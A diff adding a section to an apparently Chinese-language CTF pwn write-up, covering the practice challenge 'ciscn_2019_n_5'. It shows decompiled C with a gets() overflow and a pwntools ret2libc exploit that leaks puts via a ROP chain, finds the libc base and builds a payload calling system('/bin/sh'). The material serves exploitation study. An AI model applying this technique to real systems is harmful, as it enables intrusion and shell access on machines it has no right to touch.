@@ -49,6 +49,40 @@ libc动态链接库有以下两个性质：
 
 需要注意的是，`encrypt`函数对缓冲区中的字符进行了异或操作，可能需要复原一下（尽管在本exp中没有写也攻击成功了）
 
+
+## ciscn_2019_n_5
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char text[30]; // [rsp+0h] [rbp-20h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("tell me your name");
+  read(0, name, 0x64uLL);
+  puts("wow~ nice name!");
+  puts("What do you want to say to me?");
+  gets(text);
+  return 0;
+}
+```
+
+与[ciscn_2019_c_1](#ciscn_2019_c_1)较相似，不过写得更快，代码也更好看了点，算是一种小进步
+
+```python
+context(os='linux', arch='amd64')
+pop_rdi_ret = next(elf.search(asm('pop rdi\nret')))
+payload_a = b'a'*0x28 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])
+io.sendline(payload_a)
+puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
+
+libc = LibcSearcher('puts', puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system = libc_base + libc.dump('system')
+bin_sh = libc_base + libc.dump('str_bin_sh')
+payload_b = b'a'*0x28 + p64(pop_rdi_ret+2) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+```
+
 ## [OGeek2019]babyrop
 
 ```c
